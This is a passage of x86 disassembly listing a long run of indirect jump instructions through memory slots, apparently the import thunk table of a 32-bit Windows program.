  41c0cc:	jmp    DWORD PTR ds:0x41e0d0
  41c0d2:	jmp    DWORD PTR ds:0x41e0d4
  41c0d8:	jmp    DWORD PTR ds:0x41e0d8
  41c0de:	jmp    DWORD PTR ds:0x41e0dc
  41c0e4:	jmp    DWORD PTR ds:0x41e0e4
  41c0ea:	jmp    DWORD PTR ds:0x41e0ec
  41c0f0:	jmp    DWORD PTR ds:0x41e0f0
  41c0f6:	jmp    DWORD PTR ds:0x41e0f4
  41c0fc:	jmp    DWORD PTR ds:0x41e0f8
  41c102:	jmp    DWORD PTR ds:0x41e0fc
  41c108:	jmp    DWORD PTR ds:0x41e100
  41c10e:	jmp    DWORD PTR ds:0x41e104
  41c114:	jmp    DWORD PTR ds:0x41e108
  41c11a:	jmp    DWORD PTR ds:0x41e10c
  41c120:	jmp    DWORD PTR ds:0x41e110
  41c126:	jmp    DWORD PTR ds:0x41e114
  41c12c:	jmp    DWORD PTR ds:0x41e118
  41c132:	jmp    DWORD PTR ds:0x41e11c
  41c138:	jmp    DWORD PTR ds:0x41e120
  41c13e:	jmp    DWORD PTR ds:0x41e124
  41c144:	jmp    DWORD PTR ds:0x41e128
  41c14a:	jmp    DWORD PTR ds:0x41e12c
  41c150:	jmp    DWORD PTR ds:0x41e130
  41c156:	jmp    DWORD PTR ds:0x41e134
  41c15c:	jmp    DWORD PTR ds:0x41e138
  41c162:	jmp    DWORD PTR ds:0x41e13c
  41c168:	jmp    DWORD PTR ds:0x41e140
  41c16e:	jmp    DWORD PTR ds:0x41e144
  41c174:	jmp    DWORD PTR ds:0x41e148
  41c17a:	jmp    DWORD PTR ds:0x41e14c
  41c180:	jmp    DWORD PTR ds:0x41e150
  41c186:	jmp    DWORD PTR ds:0x41e154
  41c18c:	jmp    DWORD PTR ds:0x41e158
  41c192:	jmp    DWORD PTR ds:0x41e15c
  41c198:	jmp    DWORD PTR ds:0x41e160
  41c19e:	jmp    DWORD PTR ds:0x41e164
  41c1a4:	jmp    DWORD PTR ds:0x41e168
  41c1aa:	jmp    DWORD PTR ds:0x41e16c
  41c1b0:	jmp    DWORD PTR ds:0x41e170
  41c1b6:	jmp    DWORD PTR ds:0x41e174
  41c1bc:	jmp    DWORD PTR ds:0x41e178
  41c1c2:	jmp    DWORD PTR ds:0x41e17c
  41c1c8:	jmp    DWORD PTR ds:0x41e180
  41c1ce:	jmp    DWORD PTR ds:0x41e184
  41c1d4:	jmp    DWORD PTR ds:0x41e188
  41c1da:	jmp    DWORD PTR ds:0x41e18c
  41c1e0:	jmp    DWORD PTR ds:0x41e190
  41c1e6:	jmp    DWORD PTR ds:0x41e194
  41c1ec:	jmp    DWORD PTR ds:0x41e198
  41c1f2:	jmp    DWORD PTR ds:0x41e19c
  41c1f8:	jmp    DWORD PTR ds:0x41e1a0
  41c1fe:	jmp    DWORD PTR ds:0x41e1a4
  41c204:	jmp    DWORD PTR ds:0x41e1a8
  41c20a:	jmp    DWORD PTR ds:0x41e1ac
  41c210:	jmp    DWORD PTR ds:0x41e1b0
  41c216:	jmp    DWORD PTR ds:0x41e1b4
  41c21c:	jmp    DWORD PTR ds:0x41e1b8
  41c222:	jmp    DWORD PTR ds:0x41e1bc
  41c228:	jmp    DWORD PTR ds:0x41e1c0
  41c22e:	jmp    DWORD PTR ds:0x41e1c4
  41c234:	jmp    DWORD PTR ds:0x41e1c8
  41c23a:	jmp    DWORD PTR ds:0x41e1cc
  41c240:	jmp    DWORD PTR ds:0x41e1d0
  41c246:	jmp    DWORD PTR ds:0x41e1d4
  41c24c:	jmp    DWORD PTR ds:0x41e1d8
  41c252:	jmp    DWORD PTR ds:0x41e1dc
  41c258:	jmp    DWORD PTR ds:0x41e1e0
  41c25e:	jmp    DWORD PTR ds:0x41e1e4
  41c264:	jmp    DWORD PTR ds:0x41e1e8
  41c26a:	jmp    DWORD PTR ds:0x41e1ec
  41c270:	jmp    DWORD PTR ds:0x41e1f0
  41c276:	jmp    DWORD PTR ds:0x41e1f4
  41c27c:	jmp    DWORD PTR ds:0x41e1f8
  41c282:	jmp    DWORD PTR ds:0x41e1fc
  41c288:	jmp    DWORD PTR ds:0x41e200
  41c28e:	jmp    DWORD PTR ds:0x41e204
  41c294:	jmp    DWORD PTR ds:0x41e208
  41c29a:	jmp    DWORD PTR ds:0x41e20c
  41c2a0:	jmp    DWORD PTR ds:0x41e210
  41c2a6:	jmp    DWORD PTR ds:0x41e214
  41c2ac:	jmp    DWORD PTR ds:0x41e218
  41c2b2:	jmp    DWORD PTR ds:0x41e21c
  41c2b8:	jmp    DWORD PTR ds:0x41e220
  41c2be:	jmp    DWORD PTR ds:0x41e224
  41c2c4:	jmp    DWORD PTR ds:0x41e228
  41c2ca:	jmp    DWORD PTR ds:0x41e22c
  41c2d0:	jmp    DWORD PTR ds:0x41e230
  41c2d6:	jmp    DWORD PTR ds:0x41e234
  41c2dc:	jmp    DWORD PTR ds:0x41e238
  41c2e2:	jmp    DWORD PTR ds:0x41e23c
  41c2e8:	jmp    DWORD PTR ds:0x41e240
  41c2ee:	jmp    DWORD PTR ds:0x41e244
  41c2f4:	jmp    DWORD PTR ds:0x41e248
  41c2fa:	jmp    DWORD PTR ds:0x41e24c
  41c300:	jmp    DWORD PTR ds:0x41e250
  41c306:	jmp    DWORD PTR ds:0x41e254
  41c30c:	jmp    DWORD PTR ds:0x41e258
  41c312:	jmp    DWORD PTR ds:0x41e25c
  41c318:	jmp    DWORD PTR ds:0x41e260
  41c31e:	jmp    DWORD PTR ds:0x41e264
  41c324:	jmp    DWORD PTR ds:0x41e268
  41c32a:	jmp    DWORD PTR ds:0x41e26c
  41c330:	jmp    DWORD PTR ds:0x41e270
  41c336:	jmp    DWORD PTR ds:0x41e274
  41c33c:	jmp    DWORD PTR ds:0x41e278
  41c342:	jmp    DWORD PTR ds:0x41e27c
  41c348:	jmp    DWORD PTR ds:0x41e280
  41c34e:	jmp    DWORD PTR ds:0x41e284
  41c354:	jmp    DWORD PTR ds:0x41e288
  41c35a:	jmp    DWORD PTR ds:0x41e28c
  41c360:	jmp    DWORD PTR ds:0x41e290
  41c366:	jmp    DWORD PTR ds:0x41e294
  41c36c:	jmp    DWORD PTR ds:0x41e298
  41c372:	jmp    DWORD PTR ds:0x41e29c
  41c378:	jmp    DWORD PTR ds:0x41e2a0
  41c37e:	jmp    DWORD PTR ds:0x41e2a4
  41c384:	jmp    DWORD PTR ds:0x41e2a8
  41c38a:	jmp    DWORD PTR ds:0x41e2ac
  41c390:	jmp    DWORD PTR ds:0x41e2b0
  41c396:	jmp    DWORD PTR ds:0x41e2b4
  41c39c:	jmp    DWORD PTR ds:0x41e2b8
  41c3a2:	jmp    DWORD PTR ds:0x41e2bc
  41c3a8:	jmp    DWORD PTR ds:0x41e2c0
  41c3ae:	jmp    DWORD PTR ds:0x41e2c4
  41c3b4:	jmp    DWORD PTR ds:0x41e2c8
  41c3ba:	jmp    DWORD PTR ds:0x41e2cc
  41c3c0:	jmp    DWORD PTR ds:0x41e2d0
  41c3c6:	jmp    DWORD PTR ds:0x41e2d4
  41c3cc:	jmp    DWORD PTR ds:0x41e2d8
  41c3d2:	jmp    DWORD PTR ds:0x41e2dc
  41c3d8:	jmp    DWORD PTR ds:0x41e2e0
  41c3de:	jmp    DWORD PTR ds:0x41e2e4
  41c3e4:	jmp    DWORD PTR ds:0x41e2e8
  41c3ea:	jmp    DWORD PTR ds:0x41e2ec
  41c3f0:	jmp    DWORD PTR ds:0x41e2f0
  41c3f6:	jmp    DWORD PTR ds:0x41e2f4
  41c3fc:	jmp    DWORD PTR ds:0x41e2f8
  41c402:	jmp    DWORD PTR ds:0x41e2fc
  41c408:	jmp    DWORD PTR ds:0x41e300
  41c40e:	jmp    DWORD PTR ds:0x41e304
  41c414:	jmp    DWORD PTR ds:0x41e308
  41c41a:	jmp    DWORD PTR ds:0x41e30c
  41c420:	jmp    DWORD PTR ds:0x41e310
  41c426:	jmp    DWORD PTR ds:0x41e314
  41c42c:	jmp    DWORD PTR ds:0x41e318
  41c432:	jmp    DWORD PTR ds:0x41e31c
  41c438:	jmp    DWORD PTR ds:0x41e320
  41c43e:	jmp    DWORD PTR ds:0x41e324
  41c444:	jmp    DWORD PTR ds:0x41e328
  41c44a:	jmp    DWORD PTR ds:0x41e32c
  41c450:	jmp    DWORD PTR ds:0x41e330
  41c456:	jmp    DWORD PTR ds:0x41e334
  41c45c:	jmp    DWORD PTR ds:0x41e338
  41c462:	jmp    DWORD PTR ds:0x41e33c
  41c468:	jmp    DWORD PTR ds:0x41e340
  41c46e:	jmp    DWORD PTR ds:0x41e344
  41c474:	jmp    DWORD PTR ds:0x41e348
  41c47a:	jmp    DWORD PTR ds:0x41e34c
  41c480:	jmp    DWORD PTR ds:0x41e350
  41c486:	jmp    DWORD PTR ds:0x41e354
  41c48c:	jmp    DWORD PTR ds:0x41e358
  41c492:	jmp    DWORD PTR ds:0x41e35c
  41c498:	jmp    DWORD PTR ds:0x41e360
  41c49e:	jmp    DWORD PTR ds:0x41e364
  41c4a4:	jmp    DWORD PTR ds:0x41e368
  41c4aa:	jmp    DWORD PTR ds:0x41e36c
  41c4b0:	jmp    DWORD PTR ds:0x41e370
  41c4b6:	jmp    DWORD PTR ds:0x41e374
  41c4bc:	jmp    DWORD PTR ds:0x41e378
  41c4c2:	jmp    DWORD PTR ds:0x41e37c
  41c4c8:	jmp    DWORD PTR ds:0x41e380
  41c4ce:	jmp    DWORD PTR ds:0x41e384
  41c4d4:	jmp    DWORD PTR ds:0x41e388
  41c4da:	jmp    DWORD PTR ds:0x41e38c
  41c4e0:	jmp    DWORD PTR ds:0x41e390
  41c4e6:	jmp    DWORD PTR ds:0x41e394
  41c4ec:	jmp    DWORD PTR ds:0x41e398
  41c4f2:	jmp    DWORD PTR ds:0x41e39c
  41c4f8:	jmp    DWORD PTR ds:0x41e3a0
  41c4fe:	jmp    DWORD PTR ds:0x41e3a4
  41c504:	jmp    DWORD PTR ds:0x41e3a8
  41c50a:	jmp    DWORD PTR ds:0x41e3ac
  41c510:	jmp    DWORD PTR ds:0x41e3b0
  41c516:	jmp    DWORD PTR ds:0x41e3b4
  41c51c:	jmp    DWORD PTR ds:0x41e3b8
  41c522:	jmp    DWORD PTR ds:0x41e3bc
  41c528:	jmp    DWORD PTR ds:0x41e3c0
  41c52e:	jmp    DWORD PTR ds:0x41e3c4
  41c534:	jmp    DWORD PTR ds:0x41e3c8
  41c53a:	jmp    DWORD PTR ds:0x41e3cc
  41c540:	jmp    DWORD PTR ds:0x41e3d0
  41c546:	jmp    DWORD PTR ds:0x41e3d4
